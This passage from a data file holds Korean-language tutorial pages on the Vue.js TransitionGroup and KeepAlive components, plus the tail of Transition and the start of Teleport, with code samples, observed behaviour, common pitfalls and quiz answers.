        label: "문제의 구조: Transition 은 '요소의 교체' 에 프레임 단위 클래스를 끼우는 것이라, 교체가 있어야 하고 하나여야 하며 끝을 알아야 한다",
        body: "Transition이 하는 일은 셋입니다. 교체를 감지하고(v-if·v-show·:is·key. 텍스트 변경은 교체가 아님 ㄱ, ㄷ), 들어오는/나가는 요소에 from → (프레임) → to 클래스를 붙이고(active는 내내 ㄹ), transitionend/animationend로 끝을 알아 정리합니다(type ㅁ, :css=false면 done ㅂ). 교체 대상이 하나여야 어느 요소에 붙일지 정해지고(ㄴ, ㅍ), 둘이 바뀌면 동시 또는 순서(mode ㅇ)입니다. 훅은 그 사이의 콜백이라 던지면 사슬이 멈춥니다(ㅅ). 첫 렌더는 교체가 아니라 appear가 따로입니다(ㅋ). 처방은 '무엇이 교체되나(key), 하나인가, 끝을 어떻게 아나(type·done)'를 확인하고 CSS는 transform·opacity로 두는 것입니다.",
        code: "교체 감지 (v-if · v-show · :is · key)  →  나가는 요소: leave-from+active → [프레임] → active+to → [end] 제거\n                                      →  들어오는 요소: enter-from+active → [프레임] → active+to → [end] 제거\n  교체 아님 (텍스트 ㄱ · 같은 태그 재사용 ㄷ) → 없음   ·   대상 하나 (ㄴ ㅍ)   ·   끝 = transitionend/animationend (type ㅁ) 또는 done (ㅂ)\n  둘 바뀌면 동시 / out-in / in-out (ㅇ)   ·   훅 던지면 멈춤 (ㅅ)   ·   첫 렌더는 appear (ㅋ)",
        codeLang: "text",
      },
      {
        label: "다음 입구",
        body: "요소 하나가 아니라 리스트의 항목들에 전환을 거는 것이 다음 페이지 'TransitionGroup'입니다. 실제로 돌려 보면 재정렬된 항목 전부에 list-move가 붙었고 떠나는 항목은 leave 클래스와 함께 position: absolute로 흐름에서 빠졌습니다.",
      },
      {
        label: "확인 질문",
        body: "(1) 탭 내용 전환에서 두 패널이 겹쳐 높이가 튑니다. 어떻게? (2) 알림 토스트가 들어올 때 Animate.css의 bounceIn, 나갈 때 fadeOut을 쓰려 합니다. 어떻게? (3) 모달이 열릴 때 배경 오버레이와 모달 상자가 다른 속도로 움직여야 합니다. Transition 하나로 될까요?",
        notes: [
          {
            title: "답",
            body: "(1) <Transition name=\"fade\" mode=\"out-in\">으로 나가는 패널이 끝난 뒤 들어오게 합니다. 실제로 돌려 보면 mode 없이는 두 요소가 동시에 존재해 겹쳤고, out-in은 after-leave 뒤 before-enter 순이었습니다. 두 패널이 같은 태그면 서로 다른 key를 꼭 줍니다. 공백 시간이 싫으면 동시 전환을 유지하고 position: absolute로 하나를 흐름에서 빼 높이 튐을 막습니다. (2) <Transition enter-active-class=\"animate__animated animate__bounceIn\" leave-active-class=\"animate__animated animate__fadeOut\">. 외부 라이브러리 클래스를 active 클래스로 지정하면 Vue의 기본 v-* 클래스 대신 그것이 붙습니다. Animate.css는 animation이고 다른 transition이 섞이면 type=\"animation\"으로 끝 감지를 고정합니다. (3) Transition은 자식 하나에만 클래스를 붙이므로(실제로 자식 둘은 경고) 오버레이와 상자 둘에 다른 타이밍을 주려면 중첩 전환을 씁니다. <Transition name=\"modal\"><div class=\"overlay\" v-if=\"open\"><div class=\"box\">…</div></div></Transition>로 바깥 하나만 감싸고 CSS에서 .modal-enter-active .box { transition: transform .3s } .modal-enter-from .box { transform: scale(.9) }처럼 자손 선택자로 안쪽을 따로 움직입니다. 가장 긴 전환이 끝나야 클래스가 떼어지므로 :duration으로 명시해도 좋습니다.",
            bottom: true,
          },
        ],
      },
    ],
    sources: [
      { label: "Transition", href: `${DOCS}/guide/built-ins/transition` },
      { label: "<Transition> (API)", href: `${DOCS}/api/built-in-components#transition` },
      { label: "Animation Techniques", href: `${DOCS}/guide/extras/animation` },
    ],
  },

  {
    id: "vg-bi-transition-group",
    name: "TransitionGroup",
    tagline: "리스트 항목마다 들어옴·나감, 그리고 자리가 바뀌면 move — key 가 있어야 어느 항목인지 안다",
    intro:
      "내장 컴포넌트 둘째 페이지입니다. <TransitionGroup>은 v-for 리스트의 항목이 삽입·제거·이동될 때 전환을 거는 Transition의 리스트 판입니다. 차이 넷. 기본으로 래퍼를 렌더하지 않고 tag prop으로 지정(tag=\"ul\"). 전환 모드(out-in)는 없음(교대가 아니라서). '자식은 늘 고유 key 필수'. 클래스는 '컨테이너가 아니라 항목'에 붙음. 이동: 항목 순서가 바뀌면 v-move 클래스(moveClass로 바꿀 수 있음)가 붙고 FLIP 기법(transform)으로 움직입니다. 떠나는 항목은 .list-leave-active { position: absolute }로 흐름에서 빼야 나머지가 매끄럽게 움직입니다. 스태거: :css=\"false\" + data-index + JS 훅에서 delay. 실제로 돌려 보면 [1,2,3]을 [3,1,2]로 바꾸자 다음 프레임에 세 li 전부 'list-move', 150ms 뒤 제거였고, 항목을 지우자 떠나는 li는 'list-leave-from list-leave-active'에 position absolute(CSS), 남은 것 하나는 list-move였으며, key 없는 자식은 '<TransitionGroup> children must be keyed.' 경고였습니다. 이 노드의 질문은 하나입니다. 어느 항목이 움직였는지 Vue는 어떻게 알고 무엇을 붙이나.",
    blocks: [
      {
        label: "무엇을 다루나",
        body: "<TransitionGroup name=\"list\" tag=\"ul\"><li v-for=\"item in items\" :key=\"item\">{{ item }}</li></TransitionGroup>. CSS: .list-enter-active, .list-leave-active { transition: all 0.5s ease } .list-enter-from, .list-leave-to { opacity: 0; transform: translateX(30px) }. Transition과의 차이: tag(래퍼. 없으면 프래그먼트), '모드 없음', 'key 필수', 클래스는 항목에. 이동 전환: .list-move { transition: transform 0.5s } 와 함께, 삽입·제거로 자리가 바뀐 항목에 v-move가 붙어 FLIP으로 미끄러집니다. 떠나는 항목을 흐름에서 빼기: .list-leave-active { position: absolute }. 그러면 나머지가 즉시 자리를 계산해 move가 매끄럽습니다. moveClass prop으로 클래스 이름 변경. 스태거: <TransitionGroup :css=\"false\" @before-enter @enter=\"(el, done) => gsap.to(el, { delay: el.dataset.index * 0.15, onComplete: done })\">와 <li :data-index=\"index\">. in-DOM 템플릿은 <transition-group>. API: Transition과 같은 props(mode 제외) + tag + moveClass, 같은 이벤트. FLIP: 첫 위치(First)와 끝 위치(Last)를 재고 그 차이를 역으로 transform해(Invert) 전환으로 되돌림(Play).",
        code: "<TransitionGroup name=\"list\" tag=\"ul\">\n  <li v-for=\"item in items\" :key=\"item.id\">{{ item.text }}</li>   <!-- key 필수 -->\n</TransitionGroup>\n\n<style>\n.list-move,                      /* 자리 바뀐 항목 — FLIP transform */\n.list-enter-active,\n.list-leave-active { transition: all .5s ease; }\n.list-enter-from, .list-leave-to { opacity: 0; transform: translateX(30px); }\n.list-leave-active { position: absolute; }   /* 떠나는 것을 흐름에서 빼 나머지가 바로 움직이게 */\n</style>\n\n<!-- 스태거 (JS 훅) -->\n<TransitionGroup tag=\"ul\" :css=\"false\" @before-enter=\"onBeforeEnter\" @enter=\"onEnter\" @leave=\"onLeave\">\n  <li v-for=\"(item, index) in computedList\" :key=\"item.msg\" :data-index=\"index\">{{ item.msg }}</li>\n</TransitionGroup>\n// onEnter(el, done) { gsap.to(el, { opacity: 1, height: '1.6em', delay: el.dataset.index * 0.15, onComplete: done }) }",
        terms: [
          {
            term: "FLIP (First · Last · Invert · Play)",
            body: "자리가 바뀐 요소를 '새 자리에서 옛 자리로 되돌려 놓고(transform) 전환으로 새 자리까지 미끄러지게' 하는 기법입니다. Vue가 DOM을 새 순서로 바꾼 뒤 각 항목의 옛·새 위치 차이를 재어 translate(-dx, -dy)를 즉시 적용하고, v-move 클래스의 transition으로 0으로 돌립니다. 레이아웃 속성이 아니라 transform이라 싸고 부드럽습니다. 실제로 돌려 보면 재정렬 직후 모든 항목에 list-move가 붙었고 150ms 뒤 떼어졌습니다.",
          },
        ],
      },
      {
        label: "실제로 돌려 보면",
        body: "Chrome에서 .list-move, .list-enter-active, .list-leave-active { transition: all 100ms } .list-leave-active { position: absolute }를 두고 <TransitionGroup name=\"list\" tag=\"ul\">에 [1,2,3]을 렌더했습니다. 루트는 UL(tag). items를 [3,1,2]로 바꾸고 nextTick + rAF 뒤 세 li 전부 'list-move'(li3, li1, li2 순서). 150ms 뒤 className은 전부 ''. 그다음 [3,2]로 바꾸니(1 제거) 떠나는 li1은 'list-leave-from list-leave-active'에 computed position 'absolute'(CSS가 적용됨), li2는 'list-move'(자리가 올라감), li3은 ''(자리 그대로). key 없이 <li v-for=\"i in [1,2]\">를 두니 경고 '<TransitionGroup> children must be keyed.' 둘과 'Unhandled error during execution of transition hook'(앞 테스트의 잔여). 자리가 안 바뀐 항목에는 move가 붙지 않는다는 것(li3)과, 떠나는 항목이 absolute로 빠지는 순간 나머지가 move를 받는 것(li2)이 보였습니다.",
        code: "// Chrome 156 · .list-* { transition: all 100ms } · .list-leave-active { position: absolute }\n[1,2,3] → [3,1,2]  (nextTick + rAF):  li3:list-move · li1:list-move · li2:list-move      → 150ms 뒤 전부 ''\n[3,1,2] → [3,2]    (1 제거, nextTick):  li3:'' (자리 그대로) · li1:'list-leave-from list-leave-active' position:absolute · li2:'list-move' (올라감)\n루트 태그: UL (tag=\"ul\")\n\n<TransitionGroup><li v-for=\"i in [1,2]\">  → warn: <TransitionGroup> children must be keyed. (×2)",
      },
      {
        label: "문제: 항목을 지우면 아래 항목들이 전환 끝나고 '툭' 올라온다",
        body: "<TransitionGroup name=\"list\" tag=\"ul\">에 leave 전환(opacity 0.5s)을 걸었는데, 항목을 지우면 그 자리가 0.5초 동안 비어 있다가 전환이 끝나는 순간 아래 항목들이 점프합니다. 떠나는 항목이 전환 중에도 레이아웃 흐름을 차지하기 때문입니다. 문서의 처방이 .list-leave-active { position: absolute }입니다. 떠나는 항목을 흐름에서 빼면 나머지가 즉시 새 자리를 계산하고, Vue가 그 차이를 FLIP으로 재어 .list-move 전환으로 미끄러지게 합니다. 실제로 돌려 보면 제거 순간 떠나는 li는 absolute가 되고 아래 li에 list-move가 붙었습니다. absolute가 되면 폭이 바뀔 수 있으니 width를 고정하거나 컨테이너에 position: relative를 둡니다.",
      },
      {
        label: "문제가 나는 경우: key 와 흐름을 모를 때",
        body: "경우 ㄱ, 떠나는 항목이 흐름을 차지합니다. 위의 사고입니다. 경우 ㄴ, key 없음. 경고(실제로)와 어긋난 전환. 고유 key. 경우 ㄷ, index key. 삽입·삭제에서 모든 항목이 '바뀐' 것으로 보여 move 대신 enter/leave 폭발. 데이터 id. 경우 ㄹ, .list-move에 transition 없음. 자리는 바뀌되 즉시 점프. transition: transform. 경우 ㅁ, mode=\"out-in\" 기대. TransitionGroup에는 없음. 경우 ㅂ, 클래스를 컨테이너(ul)에 둠. 항목에 붙음. 항목 선택자. 경우 ㅅ, tag 없이 쓰고 래퍼를 기대. 프래그먼트(래퍼 없음). tag 지정. 경우 ㅇ, absolute로 뺀 항목의 폭이 변함. width 고정·컨테이너 relative. 경우 ㅈ, 스태거를 CSS로만 하려 함. 항목별 delay는 JS 훅 + data-index(또는 CSS 변수). 경우 ㅊ, 정렬(sort)이 배열을 변이해 computed 원본이 바뀜. 복사 뒤 정렬(리스트 노드). 경우 ㅋ, 수천 항목에 전환. 비용. 보이는 것만·가상화. 경우 ㅌ, in-DOM 템플릿에서 <TransitionGroup>. 소문자 <transition-group>. 경우 ㅍ, 항목이 컴포넌트인데 루트가 여럿. 클래스 붙일 요소 없음. 루트 하나.",
        code: "경우               언제 생기나                        겉모습                                      처방\nㄱ 흐름 차지        leave 중 자리 유지                   끝나고 점프                                 .x-leave-active { position: absolute }\nㄴ key 없음         v-for 만                            children must be keyed (실제로)               :key\nㄷ index key        :key=\"i\"                            move 대신 enter/leave 폭발                   item.id\nㄹ move 전환 없음     .x-move 미정의                      즉시 점프                                   transition: transform\nㅁ mode 기대        mode=\"out-in\"                       없음                                       -\nㅂ 컨테이너 클래스    ul.x-enter-active                   항목에 붙음                                  li 선택자\nㅅ 래퍼 기대        tag 없음                            프래그먼트                                   tag=\"ul\"\nㅇ 폭 변화          absolute 뒤                          좁아짐                                      width 고정 · relative\nㅈ CSS 스태거       nth-child delay                     동적 리스트엔 어긋남                            JS 훅 + data-index\nㅊ sort 변이        computed 안 sort                     원본 바뀜                                   [...a].sort()\nㅋ 대량 전환        1000+ 항목                          느림                                       가상화\nㅌ in-DOM 대문자     <TransitionGroup> in HTML            소문자 됨                                   <transition-group>\nㅍ 다중 루트 항목     컴포넌트 항목 루트 둘                 클래스 자리 없음                              루트 하나",
        codeLang: "text",
      },
      {
        label: "문제의 구조: TransitionGroup 은 'key 로 항목을 추적해 세 상태(들어옴·나감·이동)를 가르고' 각각에 클래스를 붙인다",
        body: "리스트가 바뀌면 Vue는 key로 옛 항목과 새 항목을 짝지어(리스트 노드의 key와 같은 기준) 셋으로 가릅니다. 새 key = 들어옴(enter-*), 사라진 key = 나감(leave-*), 남았지만 위치가 바뀐 key = 이동(move, FLIP). 그래서 key가 없거나 index면 가르기가 틀어집니다(ㄴ, ㄷ). 클래스는 항목 요소에 붙으니 항목이 요소여야 하고(ㅂ, ㅍ), 래퍼는 선택입니다(ㅅ). 이동은 '나머지의 새 자리'를 재어야 하므로 떠나는 항목이 흐름에 남아 있으면 새 자리가 늦게 정해져 점프합니다(ㄱ, ㅇ). 교대가 아니라 동시 다발이라 mode가 없습니다(ㅁ). 처방은 데이터 id를 key로, move에 transform 전환을, leave-active에 absolute를, 그리고 클래스는 항목 선택자에 두는 것입니다.",
        code: "옛 리스트 ↔ 새 리스트 (key 로 짝짓기 ㄴ ㄷ)\n  새 key        → enter-from+active → to       (항목 요소에 ㅂ ㅍ)\n  사라진 key     → leave-from+active → to       (absolute 로 흐름에서 빼야 ㄱ ㅇ)\n  자리 바뀐 key  → move (FLIP: transform 역적용 → 전환 ㄹ)\n래퍼 = tag (선택 ㅅ) · mode 없음 (ㅁ) · 스태거 = JS 훅 + data-index (ㅈ)",
        codeLang: "text",
      },
      {
        label: "다음 입구",
        body: "전환이 '바뀜'을 다룬다면 다음 페이지 'KeepAlive'는 '바뀌어도 버리지 않음'을 다룹니다. 실제로 돌려 보면 탭을 오가도 상태 A:1이 유지됐고, max=2에서 가장 오래 안 쓴 인스턴스가 언마운트됐습니다.",
      },
      {
        label: "확인 질문",
        body: "(1) 할 일 목록에서 완료 항목이 아래로 내려가는 정렬을 전환으로 보이려 합니다. 어떻게? (2) 항목 추가가 아래에서 위로 올라오고, 삭제는 오른쪽으로 사라져야 합니다. CSS는? (3) 검색으로 100개 중 3개만 남을 때 97개가 동시에 leave 전환하며 버벅입니다. 어떻게?",
        notes: [
          {
            title: "답",
            body: "(1) 항목에 고유 key(todo.id)를 주고 <TransitionGroup name=\"list\" tag=\"ul\">로 감싼 뒤 .list-move { transition: transform .4s }를 둡니다. 완료 토글로 정렬이 바뀌면 자리가 바뀐 항목에 list-move가 붙어 FLIP으로 미끄러집니다(실제로 재정렬 때 전부 list-move). 정렬은 computed에서 [...todos].sort(…)로 복사 뒤 합니다. (2) 들어옴은 .list-enter-from { opacity: 0; transform: translateY(20px) }와 .list-enter-active { transition: all .3s }, 나감은 .list-leave-to { opacity: 0; transform: translateX(40px) }와 .list-leave-active { transition: all .3s; position: absolute }. absolute가 있어야 남은 항목이 바로 move로 올라옵니다(실제로 떠나는 li가 absolute가 되자 아래 li에 list-move). (3) 97개의 동시 전환은 레이아웃·페인트 비용이 큽니다. 처방은 셋 중 하나입니다. leave 전환을 짧게(100ms) 두거나 없애고 enter만 남깁니다. 또는 전환을 '검색 결과 컨테이너' 하나의 Transition으로 바꿔 리스트 전체가 바뀌는 것으로 처리합니다(:key=\"query\"). 또는 보이는 항목만 렌더하는 가상 스크롤과 함께 쓰고, 전환은 transform·opacity만으로 제한합니다.",
            bottom: true,
          },
        ],
      },
    ],
    sources: [
      { label: "TransitionGroup", href: `${DOCS}/guide/built-ins/transition-group` },
      { label: "<TransitionGroup> (API)", href: `${DOCS}/api/built-in-components#transitiongroup` },
      { label: "List Rendering — key", href: `${DOCS}/guide/essentials/list#maintaining-state-with-key` },
    ],
  },

  {
    id: "vg-bi-keep-alive",
    name: "KeepAlive",
    tagline: "동적 컴포넌트를 언마운트 대신 캐시한다 — include·exclude 는 name 으로, max 는 LRU 로",
    intro:
      "내장 컴포넌트 셋째 페이지입니다. <component :is>로 탭을 바꾸면 이전 컴포넌트는 언마운트되어 상태가 사라집니다. <KeepAlive>로 감싸면 비활성 인스턴스를 캐시해 돌아올 때 그대로 복원합니다. include/exclude는 쉼표 문자열·RegExp·배열로 컴포넌트의 name 옵션과 맞춥니다(SFC는 3.2.34+부터 파일명으로 추론). max는 LRU 캐시 크기로 '가장 오래 접근하지 않은 인스턴스가 파괴'. 캐시된 컴포넌트는 mounted/unmounted 대신 onActivated/onDeactivated가 돕니다. activated는 첫 마운트와 매 복원에, deactivated는 캐시로 들어갈 때와 언마운트에. 자손에도 적용. 실제로 돌려 보면 A에서 카운트를 올리고 B로 갔다 돌아오니 'A:1' 유지, 훅은 A mounted → A activated → A deactivated → B mounted → B activated → … 였고, max=2에서 세 번째 C가 들어오자 가장 오래 안 쓴 A가 unmounted, 다시 A로 가니 A mounted(새 인스턴스, A:0)였습니다. 이 노드의 질문은 하나입니다. 무엇이 캐시되고 언제 버려지나.",
    blocks: [
      {
        label: "무엇을 다루나",
        body: "<KeepAlive><component :is=\"activeComponent\" /></KeepAlive>. 비활성 컴포넌트 인스턴스를 파괴하지 않고 캐시. include/exclude: include=\"a,b\"(쉼표 문자열), :include=\"/a|b/\"(RegExp, v-bind), :include=\"['a', 'b']\"(배열). '컴포넌트의 name 옵션과 매칭'되므로 조건부 캐시가 필요한 컴포넌트는 name을 선언. '3.2.34+ <script setup> SFC는 파일명에서 name 추론'. max: :max=\"10\"으로 '가장 오래 접근하지 않은 캐시 인스턴스가 파괴'(LRU). 생명주기: 캐시된 인스턴스는 DOM에서 떼어질 때 unmounted가 아니라 deactivated, 다시 삽입될 때 activated. onActivated는 '첫 마운트 때와 캐시에서 복원될 때마다', onDeactivated는 'DOM에서 떼어져 캐시로 갈 때와 언마운트될 때'. 둘은 캐시된 트리의 자손 컴포넌트에도 적용. API: 한 번에 활성 직접 자식 하나. v-if/v-else 분기도 한 순간 하나만. in-DOM은 <keep-alive>. 타이머·구독은 activated/deactivated 짝으로 시작·정지.",
        code: "<!-- 비활성 탭을 캐시 -->\n<KeepAlive :include=\"['Posts', 'Archive']\" :max=\"5\">\n  <component :is=\"tabs[current]\" />\n</KeepAlive>\n\n<!-- 캐시되는 컴포넌트 — name 으로 매칭 (SFC 는 파일명 추론) -->\n<script setup>\nimport { onActivated, onDeactivated } from 'vue'\nlet timer\nonActivated(() => { timer = setInterval(poll, 5000) })       // 첫 마운트 + 매 복원\nonDeactivated(() => { clearInterval(timer) })                  // 캐시로 갈 때 + 언마운트\n</script>\n\n// 보통 <script> 면 name 명시\nexport default { name: 'Posts' }",
        terms: [
          {
            term: "LRU (Least Recently Used)",
            body: "max를 넘으면 '가장 오래 접근하지 않은' 캐시 항목을 버리는 규칙입니다. 접근은 활성화(그 탭을 보는 것)입니다. 실제로 돌려 보면 max=2에서 A → B → A → B → C 순으로 쓸 때 C가 들어오는 순간 캐시 [A, B] 중 더 오래 안 본 A가 unmounted됐고, 다시 A로 가니 새로 mounted(A:0)였습니다. 탭이 많은 화면에서 메모리를 제한하면서 최근 것은 유지하는 장치입니다.",
          },
          {
            term: "activated · deactivated",
            body: "KeepAlive 안 컴포넌트의 '보임·숨김' 훅입니다. 캐시된 인스턴스는 떼어져도 unmounted가 아니고 다시 붙어도 mounted가 아니므로, 보일 때 시작하고 숨길 때 멈출 일(타이머, 구독, 스크롤 복원)은 이 둘에 둡니다. activated는 첫 마운트 직후에도 불려 mounted를 대신할 수 있고(실제로 'A mounted → A activated'), deactivated는 진짜 언마운트 때도 불립니다. 캐시 트리 안의 자손도 같은 훅을 받습니다.",
          },
        ],
      },
      {
        label: "실제로 돌려 보면",
        body: "Chrome에서 name이 A·B·C인 컴포넌트 셋(각자 카운터 n, 훅 로그)을 <KeepAlive :max=\"2\" include=\"A,B,C\"><component :is=\"tab\"/></KeepAlive>에 두었습니다. A에서 버튼을 눌러 n=1 → B → A: 화면 'A:1'(상태 유지). 로그: A mounted → A activated → A deactivated → B mounted → B activated → B deactivated → A activated. 그다음 B → C → A: B activated → A unmounted(C가 들어오며 LRU로 A 퇴출) → B deactivated → C mounted → C activated → B unmounted(A가 다시 들어오며 B 퇴출) → C deactivated → A mounted → A activated. 화면 'A:0'(새 인스턴스). 언마운트 때 A deactivated → A unmounted. 캐시된 자손도 같은 훅을 받고, 돌아왔을 때 mounted는 다시 돌지 않았습니다. 라이프사이클 노드의 측정과 합치면 KeepAlive 안에서는 '마운트 1회 + activated/deactivated 반복 + (퇴출 시) unmounted'입니다.",
        code: "// Chrome 156 · KeepAlive max=2 · A/B/C 카운터\nA (n=1) → B → A:      'A:1' 유지\n  A mounted → A activated → A deactivated → B mounted → B activated → B deactivated → A activated\nB → C → A:            'A:0' (새 인스턴스)\n  A deactivated → B activated → A unmounted (LRU) → B deactivated → C mounted → C activated → B unmounted (LRU) → C deactivated → A mounted → A activated\n언마운트:              A deactivated → A unmounted",
      },
      {
        label: "문제: 탭을 오갈 때마다 폴링 타이머가 쌓인다",
        body: "탭 컴포넌트가 onMounted에서 setInterval을 걸고 onUnmounted에서 끕니다. KeepAlive로 감싸자 탭을 바꿔도 unmounted가 안 돌아 타이머가 계속 돌고, 돌아와도 mounted가 안 돌아 새 타이머는 없지만 숨은 탭이 계속 폴링합니다. 캐시된 컴포넌트는 떼어질 때 deactivated, 붙을 때 activated만 돕니다(실제로 확인). 처방은 시작·정지 짝을 onActivated/onDeactivated로 옮기는 것입니다. activated는 첫 마운트 직후에도 불리고 deactivated는 진짜 언마운트에도 불리므로 mounted/unmounted 짝을 그대로 대체합니다. 스크롤 위치 복원도 같은 자리입니다. deactivated에서 저장, activated에서 복원.",
      },
      {
        label: "문제가 나는 경우: 캐시의 수명을 모를 때",
        body: "경우 ㄱ, mounted/unmounted에 타이머입니다. 위의 사고입니다. 경우 ㄴ, include가 안 맞음. name 옵션 없음(보통 <script>) 또는 파일명과 다름. name 선언. 경우 ㄷ, max 없이 탭 수십 개. 메모리 누적. max. 경우 ㄹ, max가 작아 자주 퇴출되어 상태가 사라짐. 실제로 max=2에서 A:0. max 조정 또는 상태를 스토어로. 경우 ㅁ, 활성 자식이 둘(v-if 둘 모두 참). 한 순간 하나만. 분기 정리. 경우 ㅂ, 캐시된 탭의 데이터가 오래됨. activated에서 갱신. 경우 ㅅ, 캐시된 컴포넌트를 강제로 새로 만들고 싶음. key 변경 또는 include에서 제외. 경우 ㅇ, 자손 컴포넌트의 activated를 안 쓰고 부모만. 자손에도 전파됨(정상). 경우 ㅈ, Transition과 함께 쓰는 순서. <Transition><KeepAlive><component/></KeepAlive></Transition>. 경우 ㅊ, Router의 <RouterView>와 조합. v-slot으로 component를 꺼내 <KeepAlive><component :is=\"Component\"/></KeepAlive>. 경우 ㅋ, in-DOM 템플릿 <KeepAlive>. 소문자 <keep-alive>. 경우 ㅌ, 캐시된 인스턴스의 DOM이 숨겨진 줄 알고 측정. DOM에서 떼어져 있음. activated 뒤.",
        code: "경우               언제 생기나                       겉모습                                    처방\nㄱ 타이머 훅        mounted/unmounted 짝                숨은 탭 폴링 계속                            activated/deactivated\nㄴ include 불일치    name 없음·다름                      캐시 안 됨                                 name 선언 · 파일명\nㄷ max 없음         탭 많음                            메모리 누적                                 :max\nㄹ max 작음         자주 퇴출                           상태 사라짐 (실제로 A:0)                      max 조정 · 스토어\nㅁ 활성 둘          v-if 둘 참                          에러                                      하나만\nㅂ 오래된 데이터     복원 뒤 그대로                       갱신 안 됨                                 activated 에서 refetch\nㅅ 강제 재생성       캐시 유지됨                         옛 상태                                    key · exclude\nㅇ 자손 훅          부모만 처리                         자손도 받음                                 -\nㅈ Transition 순서   KeepAlive 가 밖                     전환 안 됨                                 Transition > KeepAlive > component\nㅊ RouterView       직접 감싸기                         안 됨                                     v-slot=\"{ Component }\"\nㅋ in-DOM 대문자     <KeepAlive> in HTML                 소문자 됨                                  <keep-alive>\nㅌ 숨은 DOM 측정     deactivated 상태                    DOM 없음                                   activated 뒤",
        codeLang: "text",
      },
      {
        label: "문제의 구조: KeepAlive 는 '언마운트' 를 '떼어 두기' 로 바꾸고, 그래서 수명 훅의 짝이 바뀐다",
        body: "보통 동적 컴포넌트의 수명은 mounted ↔ unmounted입니다. KeepAlive는 비활성화를 '파괴'가 아니라 'DOM에서 떼어 캐시에 보관'으로 바꾸고, 복원을 '새 마운트'가 아니라 '다시 붙이기'로 바꿉니다. 그래서 짝이 activated ↔ deactivated로 바뀌고(ㄱ, ㅌ), mounted는 처음 한 번, unmounted는 캐시에서 퇴출될 때(max의 LRU ㄷ, ㄹ, 또는 KeepAlive 자체 언마운트)만 돕니다. 캐시 키는 컴포넌트 name이라 include/exclude가 name에 의존하고(ㄴ), 캐시는 한 순간 하나의 활성 자식을 전제합니다(ㅁ). 처방은 '보일 때 시작, 숨을 때 멈춤'을 activated/deactivated에 두고, 데이터 신선도는 activated에서 챙기고, 메모리는 max로 제한하는 것입니다.",
        code: "보통:      mounted ──────────────────▶ unmounted\nKeepAlive: mounted → activated ⇄ deactivated (떼어 두기 · 캐시) → [LRU 퇴출 ㄷ ㄹ · KeepAlive 언마운트] → deactivated → unmounted\n  짝 = activated/deactivated (ㄱ ㅌ) · 캐시 키 = name (ㄴ) · 활성 하나 (ㅁ)\n\n보일 때 시작 · 숨을 때 멈춤 → activated/deactivated   ·   신선도 → activated   ·   메모리 → max",
        codeLang: "text",
      },
      {
        label: "다음 입구",
        body: "수명이 아니라 '자리'를 바꾸는 것이 다음 페이지 'Teleport'입니다. 실제로 돌려 보면 자식이 #modal-target으로 이동했고 부모 자리에는 주석 둘이 남았으며, 안에서 부모의 provide를 inject했습니다.",
      },
      {
        label: "확인 질문",
        body: "(1) 상품 목록 탭과 상세 탭을 오갈 때 목록의 스크롤 위치와 필터가 유지되어야 합니다. 어떻게? (2) 목록 탭이 5분 이상 숨겨져 있었으면 돌아올 때 데이터를 다시 받고 싶습니다. 어디서? (3) 탭이 20개인데 메모리가 걱정입니다. 그리고 특정 탭은 매번 새로 열려야 합니다.",
        notes: [
          {
            title: "답",
            body: "(1) <KeepAlive><component :is=\"tab\" /></KeepAlive>로 감싸면 목록 컴포넌트 인스턴스가 캐시되어 필터 state가 유지됩니다(실제로 A:1 유지). 스크롤은 DOM이 떼어지면 사라지므로 목록 컴포넌트의 onDeactivated에서 el.scrollTop을 저장하고 onActivated에서 nextTick 뒤 복원합니다. Router와 함께면 <RouterView v-slot=\"{ Component }\"><KeepAlive><component :is=\"Component\" /></KeepAlive></RouterView>. (2) onDeactivated에서 hiddenAt = Date.now()를 기록하고 onActivated에서 Date.now() - hiddenAt > 5 * 60_000이면 refetch합니다. activated는 첫 마운트에도 불리므로 hiddenAt이 없으면 첫 로드로 처리합니다. mounted에 두면 복원 때는 돌지 않습니다(실제로 복원 시 mounted 없음). (3) :max=\"5\"처럼 LRU 크기를 둡니다. 넘으면 가장 오래 안 본 탭이 unmounted되고 돌아오면 새 인스턴스입니다(실제로 max=2에서 A:0). 매번 새로 열려야 하는 탭은 :exclude=\"['Checkout']\"로 캐시에서 빼거나(name이 있어야 함. SFC는 파일명 추론), 그 컴포넌트에 :key를 바꿔 강제로 재생성합니다.",
            bottom: true,
          },
        ],
      },
    ],
    sources: [
      { label: "KeepAlive", href: `${DOCS}/guide/built-ins/keep-alive` },
      { label: "<KeepAlive> (API)", href: `${DOCS}/api/built-in-components#keepalive` },
      { label: "onActivated() · onDeactivated()", href: `${DOCS}/api/composition-api-lifecycle#onactivated` },
    ],
  },

  {
    id: "vg-bi-teleport",
    name: "Teleport",
    tagline: "DOM 의 다른 자리에 그리되 컴포넌트 트리의 자리는 그대로 — 타깃은 먼저 있어야 한다",
    intro:
      "내장 컴포넌트 넷째 페이지입니다. 모달·토스트처럼 논리적으로는 이 컴포넌트의 것이지만 DOM에서는 body 끝에 있어야 하는 것(overflow·z-index·position에 갇히지 않게)을 <Teleport to=\"body\">로 옮깁니다. to는 CSS 선택자나 DOM 노드. '타깃은 Teleport가 마운트될 때 이미 DOM에 있어야 한다'(컴포넌트 자신이 렌더하는 요소는 안 됨. 3.5+ defer로 같은 틱의 나중 요소까지 허용). 논리 관계는 유지되어 props·emit·provide/inject·DevTools 트리가 그대로입니다. disabled로 제자리 렌더 토글. 같은 타깃에 여럿이면 마운트 순서로 추가. SSR에서는 ctx.teleports에 따로 모이며 'body를 타깃으로 쓰지 말 것'. 실제로 돌려 보면 자식이 #modal-target 안에 그려지고 부모 자리에는 <!--teleport start--><!--teleport end--> 주석만 남았고, 안의 컴포넌트가 부모의 provide를 inject했고, disabled를 true로 바꾸니 부모 안으로 돌아왔고, 없는 타깃이면 'Failed to locate Teleport target with selector \"#nope\". Note the target element must exist before the component is mounted…' 경고였으며, 서버 렌더에서는 ctx.teleports['#modal']에 내용이 모였습니다. 이 노드의 질문은 하나입니다. DOM 자리와 논리 자리가 갈리면 무엇이 따라가고 무엇이 남나.",
    blocks: [
      {
        label: "무엇을 다루나",
